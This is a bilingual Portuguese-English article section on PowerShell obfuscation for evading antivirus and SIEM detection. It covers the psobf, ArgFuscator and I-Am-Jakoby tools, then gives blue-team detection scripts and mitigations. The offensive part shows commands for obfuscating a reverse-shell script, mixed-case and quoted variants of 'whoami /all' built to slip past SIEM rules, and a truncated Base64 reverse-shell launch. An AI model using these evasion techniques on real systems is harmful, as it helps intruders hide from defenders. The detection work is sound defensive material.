2. Contexto e Relevância / Context and Relevance Original

A ofuscação é uma das técnicas mais eficazes para evadir deteção. Ao transformar o código, tornas os padrões estáticos irreconhecíveis para assinaturas de AV e regras de SIEM simples. O artigo original apresenta três ferramentas complementares: o psobf (focado em scripts completos), o ArgFuscator (focado em argumentos de linha de comando) e o PowerShell Script Obfuscator de I-Am-Jakoby (codificação multi-camada). Obfuscation is one of the most effective techniques for evading detection. By transforming the code, you make static patterns unrecognizable to AV signatures and simple SIEM rules. The original article presents three complementary tools: psobf (focused on complete scripts), ArgFuscator (focused on command-line arguments), and the PowerShell Script Obfuscator by I-Am-Jakoby (multi-layer encoding).

3. psobf — Obfuscador de Scripts Original Complementar

O psobf é um obfuscador de PowerShell escrito em Go. Oferece 5 níveis de ofuscação, desde a simples separação de caracteres até à fragmentação completa do script. Cada nível adiciona complexidade e dificulta a análise estática. psobf is a PowerShell obfuscator written in Go. It offers 5 obfuscation levels, from simple character splitting to full script fragmentation. Each level adds complexity and makes static analysis harder.

3.1 Instalação / Installation

# Requer Go instalado
go install github.com/TaurusOmar/psobf@latest

3.2 Níveis de ofuscação / Obfuscation levels

NívelTécnicaExemplo de output
1Separação de caracteres / Character splitting$([char[]]("W","r","i","t","e"...)) -join ''
2Base64 encoding[Convert]::FromBase64String('V3JpdGUt...')
3Base64 alternativo / Alternative Base64$e = [Convert]::FromBase64String(...)
4Compressão + Base64 / Compression + Base64GZip + Base64
5Fragmentação / FragmentationScript dividido em partes reconstruídas em runtime

3.3 Uso / Usage

# Ofuscação básica
psobf -i revshell.ps1 -o obf.ps1 -level 5

# Com pipeline específico
psobf -i sample.ps1 -o out.ps1 -level 2 -pipeline "strenc" -strenc rc4 -strkey 0011223344556677 -seed 7
O nível 5 é o mais agressivo, fragmentando o script em pedaços que são reconstruídos em runtime. Isto quebra assinaturas estáticas e dificulta a análise. Level 5 is the most aggressive, fragmenting the script into pieces rebuilt at runtime. This breaks static signatures and hinders analysis.

4. ArgFuscator — Obfuscador de Argumentos Original Complementar

O ArgFuscator é uma aplicação web standalone que gera linhas de comando ofuscadas para executáveis nativos do sistema. Foca-se em argumentos, não em scripts completos, explorando falhas de parsing dos executáveis para contornar regras de deteção baseadas em linha de comando. ArgFuscator is a standalone web application that generates obfuscated command lines for native system executables. It focuses on arguments, not complete scripts, exploiting executables' parsing flaws to bypass command-line-based detection rules.

4.2 Uso / Usage

# Interface web: ArgFuscator.net
# Exemplo de comando original:
whoami /all

# Output ofuscado (exemplo):
WhOaMi /AlL

# Ou com aspas e substituições:
"w"h"o"a"m"i" /a"l"l
O ArgFuscator é particularmente útil para contornar regras de SIEM que procuram strings exatas como whoami /all ou net user. ArgFuscator is particularly useful for bypassing SIEM rules that look for exact strings like whoami /all or net user.

5. PowerShell Script Obfuscator (I-Am-Jakoby) Original

O PowerShell Script Obfuscator de I-Am-Jakoby fornece um conjunto mais amplo de transformações. Em vez de focar em argumentos, visa scripts completos. Pode ofuscar código PowerShell através de Base64, Hex, ASCII, URL encoding, representações binárias, ou até reversão de strings. The PowerShell Script Obfuscator by I-Am-Jakoby provides a broader set of transformations. Rather than focusing on arguments, it targets entire scripts. It can obfuscate PowerShell code through Base64, Hex, ASCII, URL encoding, binary representations, or even string reversal.

5.1 Exemplo de uso / Usage example

# Reverse shell em Base64, executada com -e
PS > powershell -e "JABjAGwAaQBlAG4AdAAgAD0A..."

# Com Netcat a escutar, o payload ofuscado entrega a conexão
A verdadeira vantagem vem de empilhar métodos. Um script que passa por binary encoding, depois string reversal, e finalmente Base64 parecerá totalmente aleatório até ser descodificado passo a passo. Mesmo que os defensores capturem o script ofuscado, o tempo necessário para remover múltiplas camadas cria margem de manobra. The real advantage comes from stacking methods. A script that goes through binary encoding, then string reversal, and finally Base64 will look entirely random until decoded step by step. Even if defenders capture the obfuscated script, the time required to peel back multiple layers creates breathing room.

6. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade de ofuscação e execução suspeita de PowerShell. The scripts below help the blue team detect obfuscation activity and suspicious PowerShell execution.

6.1 Script 16.1 — Deteção de Comandos PowerShell Codificados / Encoded PowerShell Detection

Objetivo: detetar powershell -e, -EncodedCommand e -enc em eventos 4688 e 4104. Evidência: encoded-ps-detect.csv. Goal: detect powershell -e, -EncodedCommand, and -enc in events 4688 and 4104. Evidence: encoded-ps-detect.csv. 
# Script 16.1 - Encoded PowerShell Detection
$out = ".\encoded-ps-detect.csv"
$hits = @()
# Event 4688 - process creation
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if ($cmd -match "powershell.*(-e |-enc |-EncodedCommand)") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Source="4688"; Command=$cmd }
    }
  }
# Event 4104 - script block
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    if ($_.Message -match "powershell.*(-e |-enc )") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Source="4104"; Command=$_.Message.Substring(0,[Math]::Min(200,$_.Message.Length)) }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Encoded PS hits: $($hits.Count) -> $out" -ForegroundColor Red

6.2 Script 16.2 — Deteção de Ofuscação de Argumentos / Argument Obfuscation Detection

Objetivo: detetar padrões típicos do ArgFuscator (case randomization, aspas inválidas) em linhas de comando. Evidência: arg-obfuscation-detect.csv. Goal: detect typical ArgFuscator patterns (case randomization, invalid quotes) in command lines. Evidence: arg-obfuscation-detect.csv. 
# Script 16.2 - Argument Obfuscation Detection
$out = ".\arg-obfuscation-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    # Heuristic: mixed case in command names, excessive quotes
    if ($cmd -match "^[A-Za-z]*[A-Z][a-z]+[A-Z]" -or $cmd -match '"[a-z]"[a-z]"' -or $cmd -match '[\"]{3,}') {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Arg obfuscation hits: $($hits.Count) -> $out" -ForegroundColor Yellow

6.3 Script 16.3 — Deteção de Scripts Fragmentados / Fragmented Script Detection

Objetivo: detetar padrões de fragmentação do psobf nível 5 (arrays de strings reconstruídos com -join e Invoke-Expression). Evidência: fragmented-script-detect.csv. Goal: detect psobf level 5 fragmentation patterns (string arrays rebuilt with -join and Invoke-Expression). Evidence: fragmented-script-detect.csv. 
# Script 16.3 - Fragmented Script Detection
$out = ".\fragmented-script-detect.csv"
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    if (($msg -match "-join" -and $msg -match "Invoke-Expression") -or ($msg -match "\\$fragments" -and $msg -match "Invoke-Expression")) {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Fragmented scripts: $($hits.Count) -> $out" -ForegroundColor Red

8. Mitigações Blue Team / Mitigations Complementar

  1. AMSI ativo — deteta payloads ofuscados em tempo real (descodifica antes de escanear).
  2. Script Block Logging (4104) — regista o código após descodificação parcial, apanhando muitos obfuscadores.
  3. Detetar -EncodedCommand — Script 16.1.
  4. Detetar ofuscação de argumentos — Script 16.2.
  5. Detetar fragmentação — Script 16.3.
  6. Desativar PowerShell 2.0 — evita downgrade.
  7. Constrained Language Mode — bloqueia Invoke-Expression e [char[]] casts.
  8. AppLocker/WDAC — restringe execução de scripts não assinados.
  9. Análise de sandbox — executar scripts suspeitos em ambiente controlado para descodificar.
